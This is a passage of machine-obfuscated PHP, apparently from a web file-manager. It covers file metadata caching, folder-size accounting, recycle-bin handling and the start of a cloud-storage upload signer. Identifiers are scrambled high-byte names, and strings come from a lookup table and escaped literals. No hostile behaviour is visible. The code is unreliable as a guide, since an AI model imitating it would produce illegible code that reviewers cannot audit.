$‚·Ä¨Àƒ; return $‚·Ä¨Àƒ; } private function folderChildrenNumber($ëØ…ÃÛ®) { $œæŞº“ =& $_SERVER[Ö†ØøÖ±]; $Ìºø—‚ = $this->sourceInfo($ëØ…ÃÛ®); $ÁÜ¸øª¢ = array($œæŞº“[629] => array($œæŞº“[589], $Ìºø—‚[$œæŞº“[562]] . $ëØ…ÃÛ® . $œæŞº“[590]), $œæŞº“[626] => $Ìºø—‚[$œæŞº“[547]], $œæŞº“[481] => intval($Ìºø—‚[$œæŞº“[482]]), $œæŞº“[623] => 1); $ÇÛç†Ñé = $this->where($ÁÜ¸øª¢)->count(); $‡€Ô¼ë‡ = $this->where($ÁÜ¸øª¢)->where(array($œæŞº“[623] => 0))->count(); return array($œæŞº“[80] => $‡€Ô¼ë‡, $œæŞº“[81] => $ÇÛç†Ñé); } public function pathInfo($¹æêÏù, $™¡“ˆ­ = false) { $–Š…ç›‡ =& $_SERVER[Ö†ØøÖ±]; $™¡“ˆ­ = !1; $¹æêÏù = intval($¹æêÏù); $’Â£é·‡ = $–Š…ç›‡[511] . intval($™¡“ˆ­) . $–Š…ç›‡[438] . $¹æêÏù; $¯ÌÛªëú = _get(self::$cachePathInfo, $’Â£é·‡); if ($¯ÌÛªëú) { return $¯ÌÛªëú; } $¯‹Û¥Éí = $this->sourceInfo($¹æêÏù); if (!$¯‹Û¥Éí) { return !1; } $¯‹Û¥Éí = $this->_listDataApplyItem($¯‹Û¥Éí, $™¡“ˆ­); self::$cachePathInfo[$’Â£é·‡] = $¯‹Û¥Éí; return $¯‹Û¥Éí; } public static $cachePathInfoMore = array(); public function pathInfoMore($ó¥×š…®) { $Ûã²â˜ =& $_SERVER[Ö†ØøÖ±]; $«øÅŠÈ = _get(self::$cachePathInfoMore, $ó¥×š…®); if ($«øÅŠÈ) { return $«øÅŠÈ; } $ëÄ…ƒ‹ñ = $this->pathInfo($ó¥×š…®); if (!$ëÄ…ƒ‹ñ) { return !1; } if ($ëÄ…ƒ‹ñ[$Ûã²â˜[462]] == $Ûã²â˜[88]) { $ëÄ…ƒ‹ñ[$Ûã²â˜[79]] = $this->folderChildrenNumber($ó¥×š…®); } self::$cachePathInfoMore[$ó¥×š…®] = $ëÄ…ƒ‹ñ; return $ëÄ…ƒ‹ñ; } public function sourceInfo($ÏÌàóÓ˜) { $ÅÒÍõ£¨ =& $_SERVER[Ö†ØøÖ±]; if (!$ÏÌàóÓ˜) { return array(); } $ÏÌàóÓ˜ = intval($ÏÌàóÓ˜); $£•£›´ = $ÅÒÍõ£¨[510] . $ÏÌàóÓ˜; $£©ÛÕÊ­ = _get(self::$cacheSourceInfo, $£•£›´); if ($£©ÛÕÊ­) { return $£©ÛÕÊ­; } $ö”ì‡´ô = $this->where(array($ÅÒÍõ£¨[181] => $ÏÌàóÓ˜))->find(); self::$cacheSourceInfo[$£•£›´] = $ö”ì‡´ô; return self::$cacheSourceInfo[$£•£›´]; } public function sourceCacheClear($•ıƒ³¼¬ = false) { self::cacheClear($•ıƒ³¼¬); } public static function cacheClear($ŸÖØ–Ç = false) { $ôôÎËï =& $_SERVER[Ö†ØøÖ±]; if ($ŸÖØ–Ç == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ôôÎËï[510] . $ŸÖØ–Ç]); unset(self::$cachePathInfoMore[$ŸÖØ–Ç]); unset(self::$cachePathInfo[$ôôÎËï[2200] . $ŸÖØ–Ç]); unset(self::$cachePathInfo[$ôôÎËï[2201] . $ŸÖØ–Ç]); } public function metaSet($ÙÛœ¿ÒŸ, $ŸüÙ©‡ï = null, $ÙÓœùÙÛ = null) { $ñ¾Ô—ˆ‹ = parent::metaSet($ÙÛœ¿ÒŸ, $ŸüÙ©‡ï, $ÙÓœùÙÛ); if ($ñ¾Ô—ˆ‹) { $this->sourceCacheClear($ÙÛœ¿ÒŸ); } return $ñ¾Ô—ˆ‹; } public function pathInfoByPath($ÍäÆ“á¼, $½£½ÃÆü) { $³µĞæ®Ø =& $_SERVER[Ö†ØøÖ±]; $¥ŸÍèûÛ = !$½£½ÃÆü ? array() : explode($³µĞæ®Ø[8], trim($½£½ÃÆü, $³µĞæ®Ø[8])); $¸ÇÇïÛˆ = $ÍäÆ“á¼; foreach ($¥ŸÍèûÛ as $—¯Ã¬¯) { $Œˆ×ãŒ = array($³µĞæ®Ø[180] => $¸ÇÇïÛˆ, $³µĞæ®Ø[32] => $—¯Ã¬¯); $€«ÁµÏ = $this->field($³µĞæ®Ø[2202])->where($Œˆ×ãŒ)->select(); if (!$€«ÁµÏ) { return !1; } $€«ÁµÏ = array_sort_by($€«ÁµÏ, $³µĞæ®Ø[482]); $¸ÇÇïÛˆ = $€«ÁµÏ[0][$³µĞæ®Ø[181]]; } $éÑÆğÌ = $this->sourceInfo($¸ÇÇïÛˆ); $this->pathInfoFilter($éÑÆğÌ); return $éÑÆğÌ; } protected function updateModifyTime($ºÀøÄËß) { $Ãóšš‚€ =& $_SERVER[Ö†ØøÖ±]; $Œì¯ÉÒŒ = defined($Ãóšš‚€[2118]) ? USER_ID : 0; if (!$ºÀøÄËß) { return; } if (!is_array($ºÀøÄËß)) { $ºÀøÄËß = array($ºÀøÄËß); } foreach ($ºÀøÄËß as $æšñ„„ç => $İ”—Ä¼Ø) { $ºÀøÄËß[$æšñ„„ç] = intval($İ”—Ä¼Ø); $this->sourceCacheClear($İ”—Ä¼Ø); } $òà£”Ë£ = array($Ãóšš‚€[181] => array($Ãóšš‚€[7], $ºÀøÄËß)); $øË±Š¡¾ = array($Ãóšš‚€[628] => $Œì¯ÉÒŒ, $Ãóšš‚€[475] => time()); $this->where($òà£”Ë£)->save($øË±Š¡¾); } public function folderSizeReset($½®ÖÚŞ¶, $¶–ãÛÜÀ = false) { $Ï¦ıÆßä =& $_SERVER[Ö†ØøÖ±]; if ($this->statusIgnoreResetSpace) { return; } $æ›œÔŸç = $this->sourceInfo($½®ÖÚŞ¶); $’¡õ³¸ç = $Ï¦ıÆßä[2203] . $½®ÖÚŞ¶; CacheLock::lock($’¡õ³¸ç, 20); if ($¶–ãÛÜÀ === !1) { $this->sourceCacheClear($½®ÖÚŞ¶); $æ›œÔŸç = $this->sourceInfo($½®ÖÚŞ¶); $Ú×ı¬ã = array($Ï¦ıÆßä[454] => $½®ÖÚŞ¶, $Ï¦ıÆßä[481] => 0); $Õ£Êûª£ = $this->where($Ú×ı¬ã)->sum($Ï¦ıÆßä[76]); $¶–ãÛÜÀ = intval($Õ£Êûª£) - intval($æ›œÔŸç[$Ï¦ıÆßä[76]]); } if ($¶–ãÛÜÀ == 0) { return CacheLock::unlock($’¡õ³¸ç); } $·ÛÓ«Ğª = $this->parentLevelArray($æ›œÔŸç[$Ï¦ıÆßä[562]]); if (!$·ÛÓ«Ğª) { $·ÛÓ«Ğª = array(); } $·ÛÓ«Ğª[] = $æ›œÔŸç[$Ï¦ıÆßä[181]]; $Ú×ı¬ã = array($Ï¦ıÆßä[181] => array($Ï¦ıÆßä[469], $·ÛÓ«Ğª)); if ($¶–ãÛÜÀ < 0) { $Ú×ı¬ã[$Ï¦ıÆßä[76]] = array($Ï¦ıÆßä[1068], abs($¶–ãÛÜÀ)); } $this->where($Ú×ı¬ã)->setAdd($Ï¦ıÆßä[76], $¶–ãÛÜÀ); CacheLock::unlock($’¡õ³¸ç); $‚èøï = $Ï¦ıÆßä[2204] . $æ›œÔŸç[$Ï¦ıÆßä[178]] . $Ï¦ıÆßä[4] . $æ›œÔŸç[$Ï¦ıÆßä[547]]; $„÷…µüÆ = array($æ›œÔŸç[$Ï¦ıÆßä[178]], $æ›œÔŸç[$Ï¦ıÆßä[547]]); TaskRun::timeLimitCall($‚èøï, $Ï¦ıÆßä[2205], $„÷…µüÆ, 1.5); } public function folderSizeResetChildren($û¦è¶¤ş) { $˜¼£ÜÍ´ =& $_SERVER[Ö†ØøÖ±]; $this->sourceCacheClear($û¦è¶¤ş); $°Œ—„Å¨ = $this->sourceInfo($û¦è¶¤ş); $®Ç™÷éŞ = array($˜¼£ÜÍ´[623] => 1, $˜¼£ÜÍ´[626] => $°Œ—„Å¨[$˜¼£ÜÍ´[547]], $˜¼£ÜÍ´[629] => array($˜¼£ÜÍ´[589], $°Œ—„Å¨[$˜¼£ÜÍ´[562]] . $û¦è¶¤ş . $˜¼£ÜÍ´[590])); $„¸õ¢œ± = $˜¼£ÜÍ´[2206]; $Ù°®¤á¹ = $this->field($„¸õ¢œ±)->where($®Ç™÷éŞ)->select(); $®Ç™÷éŞ[$˜¼£ÜÍ´[462]] = 0; $ÇİŠÇ‰Ã = $this->field($„¸õ¢œ±)->where($®Ç™÷éŞ)->select(); if (!$ÇİŠÇ‰Ã) { return; } $Ù°®¤á¹[] = $°Œ—„Å¨; $Ù°®¤á¹ = array_to_keyvalue($Ù°®¤á¹, $˜¼£ÜÍ´[181]); foreach ($Ù°®¤á¹ as $ğÇ£ÚĞ => $‘‹¿Ö´) { $Ù°®¤á¹[$ğÇ£ÚĞ][$˜¼£ÜÍ´[2207]] = $Ù°®¤á¹[$ğÇ£ÚĞ][$˜¼£ÜÍ´[76]]; $Ù°®¤á¹[$ğÇ£ÚĞ][$˜¼£ÜÍ´[76]] = 0; } foreach ($ÇİŠÇ‰Ã as $‘‹¿Ö´) { $¡ê¯‹ƒ¦ = $‘‹¿Ö´[$˜¼£ÜÍ´[180]] . $˜¼£ÜÍ´[12]; if (!isset($Ù°®¤á¹[$¡ê¯‹ƒ¦])) { continue; } if ($‘‹¿Ö´[$˜¼£ÜÍ´[482]] == $Ù°®¤á¹[$¡ê¯‹ƒ¦][$˜¼£ÜÍ´[482]]) { $Ù°®¤á¹[$¡ê¯‹ƒ¦][$˜¼£ÜÍ´[76]] += $‘‹¿Ö´[$˜¼£ÜÍ´[76]]; } } foreach ($Ù°®¤á¹ as $‘‹¿Ö´) { $‹ºÅ˜æ£ = $this->parentLevelArray($‘‹¿Ö´[$˜¼£ÜÍ´[562]]); foreach ($‹ºÅ˜æ£ as $¡ê¯‹ƒ¦) { $¡ê¯‹ƒ¦ = $¡ê¯‹ƒ¦ . $˜¼£ÜÍ´[12]; if (!isset($Ù°®¤á¹[$¡ê¯‹ƒ¦])) { continue; } if ($‘‹¿Ö´[$˜¼£ÜÍ´[482]] == $Ù°®¤á¹[$¡ê¯‹ƒ¦][$˜¼£ÜÍ´[482]]) { $Ù°®¤á¹[$¡ê¯‹ƒ¦][$˜¼£ÜÍ´[76]] += $‘‹¿Ö´[$˜¼£ÜÍ´[76]]; } } } $’Î®ÎÃ‚ = array(); foreach ($Ù°®¤á¹ as $‘‹¿Ö´) { if ($‘‹¿Ö´[$˜¼£ÜÍ´[76]] == $‘‹¿Ö´[$˜¼£ÜÍ´[2207]]) { continue; } $’Î®ÎÃ‚[] = array($˜¼£ÜÍ´[181], $‘‹¿Ö´[$˜¼£ÜÍ´[181]], $˜¼£ÜÍ´[76], $‘‹¿Ö´[$˜¼£ÜÍ´[76]]); } $this->saveAll($’Î®ÎÃ‚); } public function userSpaceReset($¾ÍÏÚ³Ø = false) { $ö—ğ¢¹ğ =& $_SERVER[Ö†ØøÖ±]; $ê‘•¡ß¿ = $this->where(array($ö—ğ¢¹ğ[178] => self::TYPE_USER, $ö—ğ¢¹ğ[547] => $¾ÍÏÚ³Ø, $ö—ğ¢¹ğ[462] => 0))->sum($ö—ğ¢¹ğ[76]); $ê‘•¡ß¿ = !$ê‘•¡ß¿ || $ê‘•¡ß¿ <= 0 ? 0 : $ê‘•¡ß¿; Model($ö—ğ¢¹ğ[555])->userEdit($¾ÍÏÚ³Ø, array($ö—ğ¢¹ğ[1886] => $ê‘•¡ß¿)); } public function targetSpaceUpdate($°°‚öÆ¶, $àèçîğ«) { $ÎÊ¾†ºˆ =& $_SERVER[Ö†ØøÖ±]; if (!$àèçîğ«) { return; } if (!in_array($°°‚öÆ¶, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Üó÷ñƒÕ = $this->targetSpaceSize($°°‚öÆ¶, $àèçîğ«); if ($°°‚öÆ¶ == self::TYPE_USER) { Model($ÎÊ¾†ºˆ[555])->userEdit($àèçîğ«, array($ÎÊ¾†ºˆ[1886] => $Üó÷ñƒÕ)); } else { if ($°°‚öÆ¶ == self::TYPE_GROUP) { Model($ÎÊ¾†ºˆ[563])->groupEdit($àèçîğ«, array($ÎÊ¾†ºˆ[1886] => $Üó÷ñƒÕ)); } } } public function targetSpaceSize($ƒµ†ë¸¹, $‘ÕŠö­ó) { $Âş‘šÁ§ =& $_SERVER[Ö†ØøÖ±]; $ÚèŞªœ£ = 0; $¡½£› = $this->targetSourceRoot($ƒµ†ë¸¹, $‘ÕŠö­ó, !0); foreach ($¡½£› as $´Óµş»ª) { if (!$´Óµş»ª) { continue; } $ÚèŞªœ£ += floatval($´Óµş»ª[$Âş‘šÁ§[76]]); $’ÛÅ¢†³ = array($Âş‘šÁ§[629] => array($Âş‘šÁ§[589], $Âş‘šÁ§[572] . $´Óµş»ª[$Âş‘šÁ§[181]] . $Âş‘šÁ§[590])); $ùğÁƒŸ = Model($Âş‘šÁ§[480])->field($Âş‘šÁ§[468])->where($’ÛÅ¢†³)->select(); $ùğÁƒŸ = array_to_keyvalue($ùğÁƒŸ, $Âş‘šÁ§[12], $Âş‘šÁ§[181]); $ùğÁƒŸ = array_unique(array_filter($ùğÁƒŸ)); if ($ùğÁƒŸ) { $’ÛÅ¢†³ = array($Âş‘šÁ§[468] => array($Âş‘šÁ§[469], $ùğÁƒŸ)); $ÚèŞªœ£ += floatval($this->where($’ÛÅ¢†³)->sum($Âş‘šÁ§[76])); } } $ÚèŞªœ£ = !$ÚèŞªœ£ || $ÚèŞªœ£ <= 0 ? 0 : $ÚèŞªœ£; return $ÚèŞªœ£; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($³¢ğš°à) { return $this->fileTypeProfile($³¢ğš°à, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Å£Ô•«â) { return $this->fileTypeProfile($Å£Ô•«â, SourceModel::TYPE_GROUP); } private function fileTypeProfile($«ÃĞÑ²¥, $Ù‰Ğ±ĞÂ) { $ ßÃàıÇ =& $_SERVER[Ö†ØøÖ±]; $ÎØ¢éÄÅ = $ ßÃàıÇ[2208] . $«ÃĞÑ²¥ . $ ßÃàıÇ[11] . $Ù‰Ğ±ĞÂ; $Øöá¹®Ú = Cache::get($ÎØ¢éÄÅ); if ($Øöá¹®Ú) { return $Øöá¹®Ú; } $¨é×™ = array($ ßÃàıÇ[623] => 0); if ($«ÃĞÑ²¥ != !1) { $¨é×™[$ ßÃàıÇ[547]] = $«ÃĞÑ²¥; $¨é×™[$ ßÃàıÇ[178]] = $Ù‰Ğ±ĞÂ; } $¯ˆªä = array(); $¯ˆªä[$ ßÃàıÇ[2209]] = array($ ßÃàıÇ[2210] => LNG($ ßÃàıÇ[2209]), $ ßÃàıÇ[2211] => $this->where($¨é×™)->count(), $ ßÃàıÇ[594] => $this->where($¨é×™)->sum($ ßÃàıÇ[76])); $š´†¦Œ© = KodIO::fileTypeList(); foreach ($š´†¦Œ© as $ˆşĞÄ => $Éúò°Š•) { $¨é×™[$ ßÃàıÇ[463]] = $this->fileTypeWhere($ˆşĞÄ); $¯ˆªä[$ˆşĞÄ] = array($ ßÃàıÇ[2210] => $Éúò°Š•[$ ßÃàıÇ[32]], $ ßÃàıÇ[2211] => $this->where($¨é×™)->count(), $ ßÃàıÇ[594] => $this->where($¨é×™)->sum($ ßÃàıÇ[76])); } Cache::set($ÎØ¢éÄÅ, $¯ˆªä, 1200); return $¯ˆªä; } public function fileNameExist($“ŸĞîŠ„, $ÑóÉÜ—’) { $·¬ƒ¤© =& $_SERVER[Ö†ØøÖ±]; $œîë­…û = $this->field($·¬ƒ¤©[2212])->where(array($·¬ƒ¤©[180] => $“ŸĞîŠ„, $·¬ƒ¤©[32] => $ÑóÉÜ—’, $·¬ƒ¤©[482] => 0))->find(); return is_array($œîë­…û) ? $œîë­…û[$·¬ƒ¤©[181]] : !1; } public function childList($ÒØ‘—Ùú) { $ÒÈÑÂºì =& $_SERVER[Ö†ØøÖ±]; $òı‰ç‚— = $ÒÈÑÂºì[2185] . $ÒØ‘—Ùú; if (isset(self::$cacheChildList[$òı‰ç‚—])) { return self::$cacheChildList[$òı‰ç‚—]; } $³¹¢à®» = array($ÒÈÑÂºì[180] => intval($ÒØ‘—Ùú), $ÒÈÑÂºì[482] => 0); $ûºÙ‘Çù = $this->where($³¹¢à®»)->select(); $ûºÙ‘Çù = $ûºÙ‘Çù ? $ûºÙ‘Çù : array(); self::$cacheChildList[$òı‰ç‚—] = $ûºÙ‘Çù; foreach ($ûºÙ‘Çù as $ß°’«ö­) { $òı‰ç‚— = $ÒÈÑÂºì[510] . $ß°’«ö­[$ÒÈÑÂºì[181]]; self::$cacheSourceInfo[$òı‰ç‚—] = $ß°’«ö­; } return $ûºÙ‘Çù; } public function fileNameAuto($Ò¦­², $È¢•ø·‚, $áß‘Üì† = REPEAT_RENAME, $ç¹¯•ï§ = false) { $ƒøŞâÏ =& $_SERVER[Ö†ØøÖ±]; $ßıãäØÀ = get_path_ext($È¢•ø·‚); $ÚŞĞ§´ = $ßıãäØÀ ? basename($È¢•ø·‚, $ƒøŞâÏ[10] . $ßıãäØÀ) . $ƒøŞâÏ[2213] . $ßıãäØÀ : $È¢•ø·‚ . $ƒøŞâÏ[436]; $òÊñ‘ÔÈ = array($ƒøŞâÏ[180] => $Ò¦­², $ƒøŞâÏ[482] => 0, $ƒøŞâÏ[32] => array($ƒøŞâÏ[435], $ÚŞĞ§´)); $Ô¥âÑÕñ = $this->field($ƒøŞâÏ[32])->where($òÊñ‘ÔÈ)->select(); $ã–ó²›ò = array_to_keyvalue($Ô¥âÑÕñ, $ƒøŞâÏ[12], $ƒøŞâÏ[32]); return $this->fileNameAutoGet($ã–ó²›ò, $È¢•ø·‚, $áß‘Üì†, $ç¹¯•ï§); } public function fileNameAutoGet($îŞı¡Öš, $€¶úû¢, $¬şƒÜØõ, $¿ë®êûĞ) { $¨ĞŒ©ˆø =& $_SERVER[Ö†ØøÖ±]; if ($¬şƒÜØõ == REPEAT_REPLACE || !$îŞı¡Öš || !in_array_not_case($€¶úû¢, $îŞı¡Öš) || $¿ë®êûĞ && $¬şƒÜØõ != REPEAT_RENAME_FOLDER) { return $€¶úû¢; } if ($¬şƒÜØõ == REPEAT_SKIP) { return !1; } $ïØÉş®Â = $¨ĞŒ©ˆø[10] . get_path_ext($€¶úû¢); $ïØÉş®Â = $ïØÉş®Â == $¨ĞŒ©ˆø[10] || $¿ë®êûĞ ? $¨ĞŒ©ˆø[12] : $ïØÉş®Â; for ($…Úåó’ = 1; $…Úåó’ <= count($îŞı¡Öš) + 1; $…Úåó’++) { $îš¢˜ü = substr($€¶úû¢, 0, strlen($€¶úû¢) - strlen($ïØÉş®Â)); $ü‹ÔÛ„Š = $îš¢˜ü . "\x28{$…Úåó’}\x29{$ïØÉş®Â}"; if (!in_array_not_case($ü‹ÔÛ„Š, $îŞı¡Öš)) { return $ü‹ÔÛ„Š; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\143\145\137\162\x65\143\171\143\x6c\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\x69\155\145", "\164\151\155\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($àåÜ‘Ü = false) { $ß£¼óıß =& $_SERVER[Ö†ØøÖ±]; $àåÜ‘Ü = $àåÜ‘Ü ? $àåÜ‘Ü : USER_ID; $™”åñ¥Œ = $this->where(array($ß£¼óıß[1690] => $àåÜ‘Ü))->select(); return array_to_keyvalue($™”åñ¥Œ, $ß£¼óıß[12], $ß£¼óıß[181]); } public function moveToRecycle($§ÕÀËÄü) { $ÂÅÕåóÇ =& $_SERVER[Ö†ØøÖ±]; $Ëˆ¥çı¶ = Model($ÂÅÕåóÇ[1385]); $‹’¬ÚÌõ = $Ëˆ¥çı¶->sourceInfo($§ÕÀËÄü); if (!$‹’¬ÚÌõ || $‹’¬ÚÌõ[$ÂÅÕåóÇ[482]] == $ÂÅÕåóÇ[88]) { return; } $áìì©‰È = array($ÂÅÕåóÇ[468] => $§ÕÀËÄü, $ÂÅÕåóÇ[1690] => USER_ID, $ÂÅÕåóÇ[625] => $‹’¬ÚÌõ[$ÂÅÕåóÇ[178]], $ÂÅÕåóÇ[626] => $‹’¬ÚÌõ[$ÂÅÕåóÇ[547]], $ÂÅÕåóÇ[629] => $‹’¬ÚÌõ[$ÂÅÕåóÇ[562]]); $this->add($áìì©‰È); $this->recycleMove($§ÕÀËÄü, 1); if ($‹’¬ÚÌõ[$ÂÅÕåóÇ[462]] == $ÂÅÕåóÇ[88]) { $ØçÙÇ¡™ = array($ÂÅÕåóÇ[629] => array($ÂÅÕåóÇ[589], $‹’¬ÚÌõ[$ÂÅÕåóÇ[562]] . $§ÕÀËÄü . $ÂÅÕåóÇ[590])); $Ëˆ¥çı¶->where($ØçÙÇ¡™)->setField($ÂÅÕåóÇ[482], 1); } } public function clear() { $this->remove(!1); } public function remove($×°Ö¡¤‰ = false, $ŸÜØÀ‰ü = false) { $šß£Äİ’ =& $_SERVER[Ö†ØøÖ±]; $ŸÜØÀ‰ü = $ŸÜØÀ‰ü ? $ŸÜØÀ‰ü : USER_ID; $›à©¥ç = Model($šß£Äİ’[1385]); $½¯ùÍı = $this->listData($ŸÜØÀ‰ü); $×°Ö¡¤‰ = $×°Ö¡¤‰ === !1 ? !1 : $×°Ö¡¤‰; $éóĞ´àÊ = array(); foreach ($½¯ùÍı as $êñ½˜¤) { if ($×°Ö¡¤‰ != !1 && !in_array($êñ½˜¤, $×°Ö¡¤‰)) { continue; } $üƒ—Æğ = $›à©¥ç->sourceInfo($êñ½˜¤); $›à©¥ç->remove($êñ½˜¤, !1); $íÆô†äü = $üƒ—Æğ[$šß£Äİ’[178]] . $šß£Äİ’[11] . $üƒ—Æğ[$šß£Äİ’[547]]; $éóĞ´àÊ[$íÆô†äü] = array($šß£Äİ’[625] => $üƒ—Æğ[$šß£Äİ’[178]], $šß£Äİ’[547] => $üƒ—Æğ[$šß£Äİ’[547]]); $this->where(array($šß£Äİ’[181] => $êñ½˜¤))->delete(); } foreach ($éóĞ´àÊ as $³«Œ•§) { $›à©¥ç->targetSpaceUpdate($³«Œ•§[$šß£Äİ’[178]], $³«Œ•§[$šß£Äİ’[547]]); } } public function restore($¹Ã¢Ğ¶– = false) { $Èæ†Ù½ = $this->listData(); $this->_restoreSource($Èæ†Ù½, $¹Ã¢Ğ¶–); } public function removeUserAll($§È¥Âûú) { $this->remove(!1, $§È¥Âûú); } public function restoreItem($Ğ“§¨í½) { $this->_restoreSource(array($Ğ“§¨í½), array($Ğ“§¨í½)); } private function _restoreSource($Õ³Îš²Æ, $¸Èşøæ) { $Ï¸Şáıû =& $_SERVER[Ö†ØøÖ±]; $Ğ÷õá = Model($Ï¸Şáıû[1385]); $¸Èşøæ = $¸Èşøæ == !1 ? !1 : $¸Èşøæ; if (!$Õ³Îš²Æ) { return !0; } $¼¨àôÂÌ = array(); foreach ($Õ³Îš²Æ as $ø×±éèÆ) { if ($¸Èşøæ != !1 && !in_array($ø×±éèÆ, $¸Èşøæ)) { continue; } $ª„À¿¹Š = $Ğ÷õá->sourceInfo($ø×±éèÆ); $°¸¦üÔ = $Ğ÷õá->sourceInfo($ª„À¿¹Š[$Ï¸Şáıû[180]]); if ($°¸¦üÔ[$Ï¸Şáıû[482]] == $Ï¸Şáıû[88]) { continue; } $Ğ÷õá->lockMoveStart($ø×±éèÆ); $this->recycleMove($ø×±éèÆ, 0); if ($ª„À¿¹Š[$Ï¸Şáıû[462]] == $Ï¸Şáıû[88]) { $ŞŞæƒ‘ = array($Ï¸Şáıû[629] => array($Ï¸Şáıû[589], $ª„À¿¹Š[$Ï¸Şáıû[562]] . $ø×±éèÆ . $Ï¸Şáıû[590])); $Ğ÷õá->where($ŞŞæƒ‘)->setField($Ï¸Şáıû[482], 0); $this->restoreFolderChildren($ø×±éèÆ, $Õ³Îš²Æ); } $this->where(array($Ï¸Şáıû[181] => $ø×±éèÆ))->delete(); $Ğ÷õá->folderSizeReset($ª„À¿¹Š[$Ï¸Şáıû[180]]); $¼¨àôÂÌ[] = $ª„À¿¹Š[$Ï¸Şáıû[180]]; if ($ª„À¿¹Š[$Ï¸Şáıû[462]] == $Ï¸Şáıû[88]) { $¼¨àôÂÌ[] = $ø×±éèÆ; } $Ğ÷õá->lockMoveEnd($ø×±éèÆ); } $Ğ÷õá->updateModifyTime($¼¨àôÂÌ); } private function restoreFolderChildren($Š’Î¥ä, $İÂüÙŞ) { $ëš¬—Ø =& $_SERVER[Ö†ØøÖ±]; $€Á˜ÇİĞ = Model($ëš¬—Ø[1385]); $ÌŞÓ’ÑÒ = array($ëš¬—Ø[181] => array($ëš¬—Ø[7], array())); foreach ($İÂüÙŞ as $ó‚Èá„ç) { if ($ó‚Èá„ç == $Š’Î¥ä) { continue; } if (!$€Á˜ÇİĞ->isParentOf($Š’Î¥ä, $ó‚Èá„ç)) { continue; } $Šœİ¹  = $€Á˜ÇİĞ->sourceInfo($ó‚Èá„ç); if ($Šœİ¹ [$ëš¬—Ø[462]] == $ëš¬—Ø[88]) { $ÌŞÓ’ÑÒ[] = array($ëš¬—Ø[629] => array($ëš¬—Ø[589], $Šœİ¹ [$ëš¬—Ø[562]] . $ó‚Èá„ç . $ëš¬—Ø[590])); } else { $ÌŞÓ’ÑÒ[$ëš¬—Ø[181]][1][] = $ó‚Èá„ç; } } if (!$ÌŞÓ’ÑÒ[$ëš¬—Ø[181]][1]) { unset($ÌŞÓ’ÑÒ[$ëš¬—Ø[181]]); } if (!$ÌŞÓ’ÑÒ) { return; } if (is_array($ÌŞÓ’ÑÒ[$ëš¬—Ø[181]]) && is_array($ÌŞÓ’ÑÒ[$ëš¬—Ø[181]][1])) { $ÌŞÓ’ÑÒ[$ëš¬—Ø[181]][1] = array_unique($ÌŞÓ’ÑÒ[$ëš¬—Ø[181]][1]); } $ÌŞÓ’ÑÒ[$ëš¬—Ø[1053]] = $ëš¬—Ø[1995]; $€Á˜ÇİĞ->where($ÌŞÓ’ÑÒ)->setField($ëš¬—Ø[482], 1); } private function recycleMove($Şç£à™ô, $ÊÇ¶Ò™Í = 1) { $ÆÈ·ÊŒ† =& $_SERVER[Ö†ØøÖ±]; $œ’¦«Ì¼ = Model($ÆÈ·ÊŒ†[1385]); $×Èíö°‹ = Model($ÆÈ·ÊŒ†[2214]); $¬İöĞ‰ú = array($ÆÈ·ÊŒ†[181] => $Şç£à™ô); if ($ÊÇ¶Ò™Í) { $œ’¦«Ì¼->where($¬İöĞ‰ú)->setField($ÆÈ·ÊŒ†[482], 1); $×Èíö°‹->eventRecycle($Şç£à™ô, $ÆÈ·ÊŒ†[2215]); } else { $äÇå”û = $œ’¦«Ì¼->where($¬İöĞ‰ú)->find(); $Æš›ë‰à = $äÇå”û[$ÆÈ·ÊŒ†[462]] == $ÆÈ·ÊŒ†[88]; $œÖ½µµ = $œ’¦«Ì¼->fileNameAuto($äÇå”û[$ÆÈ·ÊŒ†[180]], $äÇå”û[$ÆÈ·ÊŒ†[32]], REPEAT_RENAME_FOLDER, $Æš›ë‰à); if ($œÖ½µµ != $äÇå”û[$ÆÈ·ÊŒ†[32]]) { $œ’¦«Ì¼->rename($Şç£à™ô, $œÖ½µµ); } $œ’¦«Ì¼->where($¬İöĞ‰ú)->setField($ÆÈ·ÊŒ†[482], 0); $×Èíö°‹->eventRecycle($Şç£à™ô, $ÆÈ·ÊŒ†[2216]); } } } goto BåäÒˆÎ£á; CÂ»½óíº„: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ä†Â½›ù) { parent::__construct($ä†Â½›ù); $this->signatureVersion($_SERVER[Ö†ØøÖ±][231]); } public function uploadFormData($­æïÙÓ¨, $¥®¿Ãô‡ = 3600) { $ƒ×§İØ§ =& $_SERVER[Ö†ØøÖ±]; $áşçş’“ = $ƒ×§İØ§[213]; $¯Ñ²’Ÿ× = $ƒ×§İØ§[247]; $ğ£²¹Ôø = $ƒ×§İØ§[257]; $’ÏªõãŞ = gmdate($ƒ×§İØ§[1377], time() + $¥®¿Ãô‡); $¼‡·Ï€ = (string) time() . $ƒ×§İØ§[71] . (string) (time() + $¥®¿Ãô‡); $ì¨…¿« = array($ƒ×§İØ§[258] => $’ÏªõãŞ, $ƒ×§İØ§[261] => array(array($ƒ×§İØ§[263] => $áşçş’“), array($ƒ×§İØ§[262] => $this->bucket), array($ƒ×§İØ§[264], $ƒ×§İØ§[265], $ƒ×§İØ§[12]), array($ƒ×§İØ§[268] => $ğ£²¹Ôø), array($ƒ×§İØ§[1378] => $¯Ñ²’Ÿ×), array($ƒ×§İØ§[1379] => $this->accessKey), array($ƒ×§İØ§[1380] => $¼‡·Ï€))); $ì¨…¿« = json_encode($ì¨…¿«); $Š¬ïØü” = hash_hmac($ƒ×§İØ§[247], $¼‡·Ï€, $this->secret); $¨ÁÔ†å¼ = sha1($ì¨…¿«); $áù¼ïí‰ = hash_hmac($ƒ×§İØ§[247], $¨ÁÔ†å¼, $Š¬ïØü”); $’ıõ°… = array($ƒ×§İØ§[263] => $áşçş’“, $ƒ×§İØ§[268] => $ğ£²¹Ôø, $ƒ×§İØ§[276] => base64_encode($ì¨…¿«), $ƒ×§İØ§[1378] => 